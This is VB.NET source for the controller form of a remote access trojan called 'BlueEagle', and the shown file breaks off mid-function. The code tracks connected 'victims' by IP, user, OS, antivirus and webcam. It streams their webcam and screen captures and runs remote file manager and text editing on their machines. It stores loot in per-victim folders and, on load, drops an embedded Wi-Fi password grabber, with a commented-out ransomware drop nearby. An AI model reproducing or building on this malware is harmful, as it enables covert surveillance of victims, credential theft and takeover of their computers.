Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Drawing.Drawing2D
Imports System.Threading
Imports System.IO
Imports System.Drawing.Imaging
Imports System.Net

Public Class Main
    'Windows 10 / 8." index 0
    'Windows XP index 1
    'Windows 7 index 2
    'Windows Vista index 3
    Public ooox As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + "watcher.jpg"
    Private cap As New Rmote_Desktop
    Friend SX As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "CamUpdate.exe"
    Dim SXdll As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "cam.dll"
    Friend sqlrar As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "sqlmap.rar"
    Friend pass1e As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "1.exe"
    Friend pass2e As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "2.exe"
    Friend wordlistrar As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "wordlist.zip"
    Friend rarX As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "RAR.exe"
    Dim unrarx As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "UnRAR.dll"
    Friend StatTurn, AdpaterTurn As Boolean
    Friend LanCurrentVictim As String = ""
    Dim OSIndex As Integer
    Public MainPort As Integer
    Public ratcountry As String = ""
    Dim per As Integer
    Public country As String
    Friend serverx, servery As Single
    Friend ratcountryx, ratcountryy As Single
    Public UODNNXMATTYW As Size
    Dim victimname As String
    Public ServerID As String
    Friend WithEvents S As KX
    Public Yy As String = "|BlueEagle|"
    Public pinger As Integer = 0
    Public tictoc As Integer = 0
    Public folder As String
    Public folder1 As String
    Dim appPath As String
    Dim Message As String
    Public xxx As Integer
    Dim fastScreen As New PictureBox
    Dim id$
    Dim ip$
    Dim RAT_Port
    Dim listimage As New ImageList
    Dim server As Boolean
    Dim victim_folder As String
    Dim picBox As New PictureBox
    Private Sub imge_desik()
        Dim bitmap As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Dim graphics__1 As Graphics = Graphics.FromImage(TryCast(bitmap, Image))
        graphics__1.CopyFromScreen(0, 0, 0, 0, bitmap.Size)
        picBox.SizeMode = PictureBoxSizeMode.AutoSize
        picBox.Image = bitmap
        Dim er As String = ooox

        Dim bm As New Bitmap(picBox.Image)
        Dim width As Integer = 2000
        Dim height As Integer = 2000
        Dim thumb As New Bitmap(width, height)
        Dim g As Graphics = Graphics.FromImage(thumb)
        g.InterpolationMode = Drawing2D.InterpolationMode.Low
        g.DrawImage(bm, New Rectangle(0, 0, width, height), New Rectangle(0, 0, bm.Width, bm.Height), GraphicsUnit.Pixel)
        g.Dispose()
        thumb.Save(er, System.Drawing.Imaging.ImageFormat.Jpeg)

        bm.Dispose()
        thumb.Dispose()
    End Sub
    Function ReturnOS(ByVal user As String) As String
        For Each item As ListViewItem In L1.Items
            If item.SubItems(2).Text.Contains(user) Or item.SubItems(2).Text.Equals(user) Then
                Return item.SubItems(3).Text 'Return OS
            End If
        Next
    End Function
    Public Sub StartListen()

        If MainPort.ToString.Length > 2 Then
            Try
                CheckForIllegalCrossThreadCalls = False
                S = New KX
                S.Start(Integer.Parse(MainPort))
            Catch ex As Exception

            End Try

        End If
    End Sub
    Private Sub Main_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Panel3.Size = New Size(196, 51)

        choose_server_country.Show()
        choose_server_country.TopMost = True
        Me.Enabled = False

        '  Dim myBitmap As Bitmap
        'myBitmap = CType(My.Resources.Armi, Bitmap)
        ' MsgBox(myBitmap.GetPixel(0, 0).ToString)
        '   Me.TransparencyKey = Color.FromArgb(33, 33, 33)

        If File.Exists(SX) Then
            File.Delete(SX)

        End If
        If File.Exists(SXdll) Then
            File.Delete(SXdll)

        End If
        File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "wifi.exe", My.Resources.WifiGrabber)
        'File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "sblransom[Don`t_Run].exe", My.Resources.saher_blue_eagle)

        Timer1.Start()

    End Sub
    Sub Connected(ByVal xxx As Integer) Handles S.Connected
        On Error Resume Next

        RichTextBox2.AppendText(S.IP(xxx) & " Connected" & vbNewLine)
        RichTextBox2.ScrollToCaret()

        S.Send(xxx, "info" & Yy)


        Insert(S.IP(xxx))
        per = L1.Items.Count
        Panel9.Refresh()
    End Sub
    Function ReturnIndexLan(ByVal OS As String)
        If OS.Contains("XP") Then
            OSIndex = 4
        ElseIf OS.Contains("7") Or OS.Contains("Seven") Then
            OSIndex = 2
        ElseIf OS.Contains("10") Or OS.Contains("8.1") Then
            OSIndex = 3
        ElseIf OS.Contains("Vista") Or OS.Contains("VISTA") Or OS.Contains("vista") Then
            OSIndex = 1
        Else
            OSIndex = 7
        End If
        Return OSIndex
    End Function
    Dim DownloadMICFolder As String
    Function ReturnIndex(ByVal OS As String)
        If OS.Contains("XP") Then
            OSIndex = 1
        ElseIf OS.Contains("7") Or OS.Contains("Seven") Then
            OSIndex = 2
        ElseIf OS.Contains("10") Or OS.Contains("8.1") Then
            OSIndex = 0
        ElseIf OS.Contains("Vista") Or OS.Contains("VISTA") Or OS.Contains("vista") Then
            OSIndex = 3
        Else
            OSIndex = 4
        End If
        Return OSIndex
    End Function
    Dim Firewall As String
    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        per = L1.Items.Count
        Panel9.Refresh()
        Dim encoded As String = BS(B)

        Dim newBytes() As Byte = Convert.FromBase64String(BS(B)) 'encoded byte array

        Dim T As String = BS(newBytes)

        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)

                Case "camr"
                    Dim f As fastcam = My.Application.OpenForms("fastcam" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New fastcam
                        f.Name = "fastcam" & sock
                        Try


                            Dim pi As New PictureBox
                            Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                            SyncLock pi
                                pi.Image = Image.FromStream(m)
                                f.PictureBox1.Image = pi.Image
                            End SyncLock
                            fastcam.Show()
                            fastcam.Left = My.Computer.Screen.WorkingArea.Width - fastcam.Width
                            fastcam.PictureBox1.Image = pi.Image



                        Catch ex As Exception

                        End Try
                    End If

                Case "info"
                    Dim f As Notify = My.Application.OpenForms("new" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                            Exit Sub
                        End If

                        '  ListView2.FindItemWithText(S.IP(sock)).ImageIndex = GetCountryNumber(UCase(A(4)))

                        ' "Windows 10 / 8.1" index 0
                        'Windows XP index 1
                        'Windows 7 index 2
                        'Windows Vista index 3



                        f = New Notify
                        f.Name = "new" & sock
                        f.Label9.Text = S.IP(sock)
                        f.Label5.Text = A(1)
                        f.Label7.Text = A(2)
                        f.Label6.Text = A(3)
                        f.Label8.Text = A(4)
                        ServerID = A(1)


                        '      MsgBox ("name" +A(1) +  "user" + A(3) + "
                        '       ListBox1.Items.Add("User Login :" + " IP: " + S.IP(sock) + " ServerID : " + A(1) + " Time : " + TimeValue(Now))
                        ' My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
                        f.Show()

                        ' My.Computer.Audio.Play(My.Resources.notify)
                        Dim L = L1.Items.Add(sock.ToString, A(1), ReturnIndex(A(3))) 'name + country 

                        L.SubItems.Add(S.IP(sock)) 'ip
                        L.SubItems.Add(A(2)) 'user
                        L.SubItems.Add(A(3)) 'os
                        L.SubItems.Add(A(4)) 'country
                        L.SubItems.Add(A(5)) 'antivirus
                        L.SubItems.Add(A(6)) 'ram
                        L.SubItems.Add(A(7)) 'version
                        L.SubItems.Add(A(8)) 'active Window
                        L.SubItems.Add(A(9)) 'cam
                        ' L.SubItems.Add(A(10))
                        'L.SubItems.Add(A(11))
                        'L.SubItems.Add(A(12))
                        'L.SubItems.Add(A(13))
                        L.ToolTipText = sock
                        RichTextBox2.AppendText(S.IP(sock) & "Logged in" & vbNewLine)
                        RichTextBox2.ScrollToCaret()

                        ''''''''''''''''''''''''''''''''''''''''''''''''''

                        If hard.Text = 1 Then

                            Dim pi As New PictureBox
                            Dim m As New IO.MemoryStream(Convert.FromBase64String(A(10)))
                            SyncLock pi
                                pi.Image = Image.FromStream(m)
                                f.PictureBox3.Image = pi.Image
                            End SyncLock

                        End If

                    End If

                    For Each victim As ListViewItem In L1.Items
                        If victim.Text.Contains(A(1)) Then

                            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Download\") Then
                            Else
                                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Download\")
                            End If
                            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Screen Capture\") Then
                            Else
                                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Screen Capture\")
                            End If

                            folder = (Application.StartupPath & "\VictimsFolder\" + A(1) & S.IP(sock) + "\Download\")
                            folder1 = (Application.StartupPath & "\VictimsFolder\" & (A(1) & S.IP(sock)) & "\Screen Capture\")

                            f.PictureBox3.Image.Save((Application.StartupPath & "/VictimsFolder/" & A(1) & S.IP(sock) & "/Screen Capture/" & "FastScareen.jpg"), Imaging.ImageFormat.Jpeg)

                        Else

                            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Download\") Then
                            Else
                                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Download\")
                            End If
                            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Screen Capture\") Then
                            Else
                                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Screen Capture\")
                            End If

                            folder = (Application.StartupPath & "\VictimsFolder\" + A(1) & S.IP(sock) + "\Download\")
                            folder1 = (Application.StartupPath & "\VictimsFolder\" & (A(1) & S.IP(sock)) & "\Screen Capture\")

                            f.PictureBox3.Image.Save((Application.StartupPath & "/VictimsFolder/" & A(1) & S.IP(sock) & "/Screen Capture/" & "FastScareen.jpg"), Imaging.ImageFormat.Jpeg)

                        End If
                    Next


                    ExecutecRAR(sock)
                  
               

                Case "@@" '
                    Dim BB As Byte() = fx(B, "@@" & Yy)(1)


                Case "VerciManager" 'needremove
                    Dim L = ListView1.Items.Add(sock.ToString, A(0), 241) 'name + country 


                    L.ToolTipText = sock

                    S.Send(sock, "iamslave")

                Case "getvictims" 'needremove

                    For ix As Integer = 0 To L1.Items.Count - 1
                        S.Send(sock, "victim" & Yy & L1.Items(ix).SubItems(0).Text & Yy & L1.Items(ix).SubItems(1).Text & Yy & L1.Items(ix).SubItems(2).Text & Yy & L1.Items(ix).SubItems(3).Text & Yy & L1.Items(ix).SubItems(4).Text & Yy & L1.Items(ix).SubItems(5).Text & Yy & L1.Items(ix).SubItems(6).Text & Yy & L1.Items(ix).SubItems(7).Text & Yy & L1.Items(ix).SubItems(8).Text & Yy & L1.Items(ix).SubItems(9).Text)
                    Next

              
 

                Case "infoDesk"

                    listimage.ImageSize = New Size(New Point(130, 100))
                    For Each x As ListViewItem In L1.SelectedItems
                        If L1.SelectedItems.Count >= 2 Then

                            PictureBox1.Image = Nothing


                        Else

                            If CheckBox1.Checked = True Then
                                Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                                SyncLock Me.PictureBox1
                                    Me.PictureBox1.Image = Image.FromStream(m)
                                    listimage.Images.RemoveByKey(ip(sock))
                                    listimage.Images.Add(ip(sock), Image.FromStream(m))
                                    L1.LargeImageList = listimage
                                    For i = 0 To listimage.Images.Count - 1
                                        For j = 0 To L1.Items.Count - 1
                                            If listimage.Images.Keys(i).Contains(L1.Items(j).SubItems(1).Text) Then
                                                L1.Items(j).ImageKey = listimage.Images.Keys(i)
                                            End If
                                        Next
                                    Next
                                End SyncLock

                            End If
                            ContextMenuStrip1.Enabled = True




                        End If
                    Next


                    pinger = 0
                    pingerTimers.Enabled = False
                Case "edittextfile"
                    If My.Application.OpenForms("Text_Editor" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim texter As New TextEditor
                    texter.sock = sock
                    texter.Name = "Text_Editor" & sock
                    texter.Text = texter.Text & " " & A(1) & " " & S.IP(sock)
                    texter.Label2.Text &= " " & S.IP(sock)
                    texter.pathoftext = A(1)
                    texter.TextBox1.Text = A(2)
                    texter.Show()
                Case "\\"    '
                    If My.Application.OpenForms("\\" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New FileManager
                    fm.sock = sock
                    fm.Name = "\\" & sock
                    fm.Label5.Text = "USER : " & L1.SelectedItems(0).Text & " " & S.IP(sock)
                    fm.ContextMenuStrip1.Items(13).Enabled = False
                    fm.Show()

                Case "FileManager"
                    Dim fff As FileManager = My.Application.OpenForms("\\" & sock)
                    If A(1) = "Error" Then

                        MsgBox("You cannot access this path [Access Denied] From Client PC", MsgBoxStyle.Exclamation)

                        fff.back()

                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(A(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".scr") Or itm.Text.EndsWith(".SCR") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPEG") Or itm.Text.EndsWith(".ico") Or itm.Text.EndsWith(".ICO") Or itm.Text.EndsWith(".svg") Or itm.Text.EndsWith(".SVG") Or itm.Text.EndsWith(".svgz") Or itm.Text.EndsWith(".SVGZ") Or itm.Text.EndsWith(".drw") Or itm.Text.EndsWith(".DRW") Or itm.Text.EndsWith(".psp") Or itm.Text.EndsWith(".PSP") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Or itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Or itm.Text.EndsWith(".dib") Or itm.Text.EndsWith(".DIB") Or itm.Text.EndsWith(".jpe") Or itm.Text.EndsWith(".JPE") Or itm.Text.EndsWith(".jfif") Or itm.Text.EndsWith(".JFIF") Or itm.Text.EndsWith(".tif") Or itm.Text.EndsWith(".TIF") Or itm.Text.EndsWith(".tiff") Or itm.Text.EndsWith(".TIFF") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".LOG") Or itm.Text.EndsWith(".readme") Or itm.Text.EndsWith(".README") Or itm.Text.EndsWith(".me") Or itm.Text.EndsWith(".ME") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".db") Or itm.Text.EndsWith(".DB") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".ZIP") Or itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".7z") Or itm.Text.EndsWith(".7Z") Or itm.Text.EndsWith(".jar") Or itm.Text.EndsWith(".JAR") Or itm.Text.EndsWith(".tar") Or itm.Text.EndsWith(".TAR") Or itm.Text.EndsWith(".tgz") Or itm.Text.EndsWith(".TGZ") Or itm.Text.EndsWith(".gz") Or itm.Text.EndsWith(".GZ") Or itm.Text.EndsWith(".bz2") Or itm.Text.EndsWith(".BZ2") Or itm.Text.EndsWith(".tbz2") Or itm.Text.EndsWith(".TBZ2") Or itm.Text.EndsWith(".gzip") Or itm.Text.EndsWith(".GZIP") Or itm.Text.EndsWith(".z") Or itm.Text.EndsWith(".Z") Or itm.Text.EndsWith(".sit") Or itm.Text.EndsWith(".SIT") Or itm.Text.EndsWith(".cab") Or itm.Text.EndsWith(".CAB") Or itm.Text.EndsWith(".lzh") Or itm.Text.EndsWith(".LZH") Or itm.Text.EndsWith(".pkg") Or itm.Text.EndsWith(".PKG") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".bat") Or itm.Text.EndsWith(".BAT") Or itm.Text.EndsWith(".cmd") Or itm.Text.EndsWith(".CMD") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".divx") Or itm.Text.EndsWith(".DIVX") Or itm.Text.EndsWith(".mkv") Or itm.Text.EndsWith(".MKV") Or itm.Text.EndsWith(".webm") Or itm.Text.EndsWith(".WEBM") Or itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".M4V") Or itm.Text.EndsWith(".mp4v") Or itm.Text.EndsWith(".MP4V") Or itm.Text.EndsWith(".mpv4") Or itm.Text.EndsWith(".MPV4") Or itm.Text.EndsWith(".ogm") Or itm.Text.EndsWith(".OGM") Or itm.Text.EndsWith(".ogv") Or itm.Text.EndsWith(".OGV") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".FLV") Or itm.Text.EndsWith(".mpeg") Or itm.Text.EndsWith(".MPEG") Or itm.Text.EndsWith(".mpg") Or itm.Text.EndsWith(".MPG") Or itm.Text.EndsWith(".mp2v") Or itm.Text.EndsWith(".MP2V") Or itm.Text.EndsWith(".mpv2") Or itm.Text.EndsWith(".MPV2") Or itm.Text.EndsWith(".m1v") Or itm.Text.EndsWith(".M1V") Or itm.Text.EndsWith(".m2v") Or itm.Text.EndsWith(".M2V") Or itm.Text.EndsWith(".m2p") Or itm.Text.EndsWith(".M2P") Or itm.Text.EndsWith(".mpe") Or itm.Text.EndsWith(".MPE") Or itm.Text.EndsWith(".ts") Or itm.Text.EndsWith(".TS") Or itm.Text.EndsWith(".m2ts") Or itm.Text.EndsWith(".M2TS") Or itm.Text.EndsWith(".mts") Or itm.Text.EndsWith(".MTS") Or itm.Text.EndsWith(".m2t") Or itm.Text.EndsWith(".M2T") Or itm.Text.EndsWith(".tps") Or itm.Text.EndsWith(".TPS") Or itm.Text.EndsWith(".hdmov") Or itm.Text.EndsWith(".HDMOV") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".3gpp") Or itm.Text.EndsWith(".3GPP") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".asf") Or itm.Text.EndsWith(".ASF") Or itm.Text.EndsWith(".ifo") Or itm.Text.EndsWith(".IFO") Or itm.Text.EndsWith(".vob") Or itm.Text.EndsWith(".VOB") Or itm.Text.EndsWith(".mpls") Or itm.Text.EndsWith(".MPLS") Or itm.Text.EndsWith(".rm") Or itm.Text.EndsWith(".RM") Or itm.Text.EndsWith(".rmvb") Or itm.Text.EndsWith(".RMVB") Then
                                itm.ImageIndex = 11
                            ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Or itm.Text.EndsWith(".it") Or itm.Text.EndsWith(".IT") Or itm.Text.EndsWith(".asx") Or itm.Text.EndsWith(".ASX") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".AU") Or itm.Text.EndsWith(".mid") Or itm.Text.EndsWith(".MID") Or itm.Text.EndsWith(".midi") Or itm.Text.EndsWith(".MIDI") Or itm.Text.EndsWith(".snd") Or itm.Text.EndsWith(".SND") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".WMA") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".AIFF") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".OGG") Or itm.Text.EndsWith(".oga") Or itm.Text.EndsWith(".OGA") Or itm.Text.EndsWith(".mka") Or itm.Text.EndsWith(".MKA") Or itm.Text.EndsWith(".m4a") Or itm.Text.EndsWith(".M4A") Or itm.Text.EndsWith(".aac") Or itm.Text.EndsWith(".AAC") Or itm.Text.EndsWith(".flac") Or itm.Text.EndsWith(".FLAC") Or itm.Text.EndsWith(".wv") Or itm.Text.EndsWith(".WV") Or itm.Text.EndsWith(".mpc") Or itm.Text.EndsWith(".MPC") Or itm.Text.EndsWith(".ape") Or itm.Text.EndsWith(".APE") Or itm.Text.EndsWith(".apl") Or itm.Text.EndsWith(".APL") Or itm.Text.EndsWith(".alac") Or itm.Text.EndsWith(".ALAC") Or itm.Text.EndsWith(".tta") Or itm.Text.EndsWith(".TTA") Or itm.Text.EndsWith(".ac3") Or itm.Text.EndsWith(".AC3") Or itm.Text.EndsWith(".dts") Or itm.Text.EndsWith(".DTS") Or itm.Text.EndsWith(".amr") Or itm.Text.EndsWith(".AMR") Or itm.Text.EndsWith(".ra") Or itm.Text.EndsWith(".RA") Or itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".WAV") Or itm.Text.EndsWith(".mpcpl") Or itm.Text.EndsWith(".MPCPL") Or itm.Text.EndsWith(".m3u") Or itm.Text.EndsWith(".M3U") Or itm.Text.EndsWith(".pls") Or itm.Text.EndsWith(".PLS") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".lnk") Or itm.Text.EndsWith(".LNK") Then
                                itm.ImageIndex = 12
                            ElseIf itm.Text.EndsWith(".bin") Or itm.Text.EndsWith(".BIN") Or itm.Text.EndsWith(".bak") Or itm.Text.EndsWith(".BAK") Or itm.Text.EndsWith(".dat") Or itm.Text.EndsWith(".DAT") Then
                                itm.ImageIndex = 13
                            ElseIf itm.Text.EndsWith(".xlsx") Or itm.Text.EndsWith(".XLSX") Or itm.Text.EndsWith(".xlsm") Or itm.Text.EndsWith(".XLSM") Or itm.Text.EndsWith(".xlsb") Or itm.Text.EndsWith(".XLSB") Or itm.Text.EndsWith(".xltm") Or itm.Text.EndsWith(".XLTM") Or itm.Text.EndsWith(".xlam") Or itm.Text.EndsWith(".XLAM") Or itm.Text.EndsWith(".xltx") Or itm.Text.EndsWith(".XLTX") Or itm.Text.EndsWith(".xll") Or itm.Text.EndsWith(".XLL") Then
                                itm.ImageIndex = 14
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".DOC") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".DOCX") Or itm.Text.EndsWith(".docm") Or itm.Text.EndsWith(".DOCM") Or itm.Text.EndsWith(".psw") Or itm.Text.EndsWith(".PSW") Or itm.Text.EndsWith(".dot") Or itm.Text.EndsWith(".DOT") Or itm.Text.EndsWith(".dotx") Or itm.Text.EndsWith(".DOTX") Or itm.Text.EndsWith(".dotm") Or itm.Text.EndsWith(".DOTM") Then
                                itm.ImageIndex = 15
                            ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".SYS") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".CSS") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INF") Then
                                itm.ImageIndex = 16
                            ElseIf itm.Text.EndsWith(".pdf") Or itm.Text.EndsWith(".PDF") Then
                                itm.ImageIndex = 17
                            ElseIf itm.Text.EndsWith(".pptx") Or itm.Text.EndsWith(".PPTX") Or itm.Text.EndsWith(".ppt") Or itm.Text.EndsWith(".PPT") Or itm.Text.EndsWith(".pps") Or itm.Text.EndsWith(".PPS") Or itm.Text.EndsWith(".pptm") Or itm.Text.EndsWith(".PPTM") Or itm.Text.EndsWith(".potx") Or itm.Text.EndsWith(".POTX") Or itm.Text.EndsWith(".potm") Or itm.Text.EndsWith(".POTM") Or itm.Text.EndsWith(".ppam") Or itm.Text.EndsWith(".PPAM") Or itm.Text.EndsWith(".ppsx") Or itm.Text.EndsWith(".PPSX") Or itm.Text.EndsWith(".ppsm") Or itm.Text.EndsWith(".PPSM") Then
                                itm.ImageIndex = 18
                            ElseIf itm.Text.EndsWith(".swf") Or itm.Text.EndsWith(".SWF") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".HTM") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".HTML") Then
                                itm.ImageIndex = 20
                            ElseIf itm.Text.EndsWith(".reg") Or itm.Text.EndsWith(".REG") Then
                                itm.ImageIndex = 19
                            ElseIf itm.Text.EndsWith(".AACCDB") Or itm.Text.EndsWith(".aaccdb") Or itm.Text.EndsWith(".ACCDE") Or itm.Text.EndsWith(".accde") Or itm.Text.EndsWith(".ACCDT") Or itm.Text.EndsWith(".accdt") Or itm.Text.EndsWith(".ACCDR") Or itm.Text.EndsWith(".accdr") Then
                                itm.ImageIndex = 21
                            ElseIf itm.Text.EndsWith(".xml") Or itm.Text.EndsWith(".XML") Then
                                itm.ImageIndex = 22
                            ElseIf itm.Text.EndsWith(".odt") Or itm.Text.EndsWith(".ODT") Or itm.Text.EndsWith(".ott") Or itm.Text.EndsWith(".OTT") Or itm.Text.EndsWith(".sxw") Or itm.Text.EndsWith(".SXW") Or itm.Text.EndsWith(".stw") Or itm.Text.EndsWith(".STW") Or itm.Text.EndsWith(".sor") Or itm.Text.EndsWith(".SOR") Or itm.Text.EndsWith(".sxc") Or itm.Text.EndsWith(".SXC") Or itm.Text.EndsWith(".stc") Or itm.Text.EndsWith(".STC") Or itm.Text.EndsWith(".sxi") Or itm.Text.EndsWith(".SXI") Or itm.Text.EndsWith(".sti") Or itm.Text.EndsWith(".STI") Or itm.Text.EndsWith(".sxd") Or itm.Text.EndsWith(".SXD") Or itm.Text.EndsWith(".std") Or itm.Text.EndsWith(".STD") Or itm.Text.EndsWith(".sxg") Or itm.Text.EndsWith(".SXG") Then
                                itm.ImageIndex = 23
                            ElseIf itm.Text.EndsWith(".temp") Or itm.Text.EndsWith(".TEMP") Or itm.Text.EndsWith(".tmp") Or itm.Text.EndsWith(".TMP") Then
                                itm.ImageIndex = 24
                            ElseIf itm.Text.EndsWith(".iso") Or itm.Text.EndsWith(".ISO") Then
                                itm.ImageIndex = 25
                            ElseIf itm.Text.EndsWith(".save") Or itm.Text.EndsWith(".SAVE") Or itm.Text.EndsWith(".sav") Or itm.Text.EndsWith(".SAV") Then
                                itm.ImageIndex = 26
                            ElseIf itm.Text.EndsWith(".crt") Or itm.Text.EndsWith(".CRT") Then
                                itm.ImageIndex = 27
                            ElseIf itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".JS") Then
                                itm.ImageIndex = 28
                            ElseIf itm.Text.EndsWith(".cat") Or itm.Text.EndsWith(".CAT") Then
                                itm.ImageIndex = 29
                            ElseIf itm.Text.EndsWith(".chm") Or itm.Text.EndsWith(".CHM") Then
                                itm.ImageIndex = 30
                            ElseIf itm.Text.EndsWith(".vmdk") Or itm.Text.EndsWith(".VMDK") Then
                                itm.ImageIndex = 31
                            ElseIf itm.Text.EndsWith(".vmx") Or itm.Text.EndsWith(".VMX") Then
                                itm.ImageIndex = 32
                            ElseIf itm.Text.EndsWith(".vbs") Or itm.Text.EndsWith(".VBS") Or itm.Text.EndsWith(".vbe") Or itm.Text.EndsWith(".VBE") Or itm.Text.EndsWith(".wsf") Or itm.Text.EndsWith(".WSF") Or itm.Text.EndsWith(".wsc") Or itm.Text.EndsWith(".WSC") Then
                                itm.ImageIndex = 33
                            ElseIf itm.Text.EndsWith(".nfo") Or itm.Text.EndsWith(".NFO") Then
                                itm.ImageIndex = 34
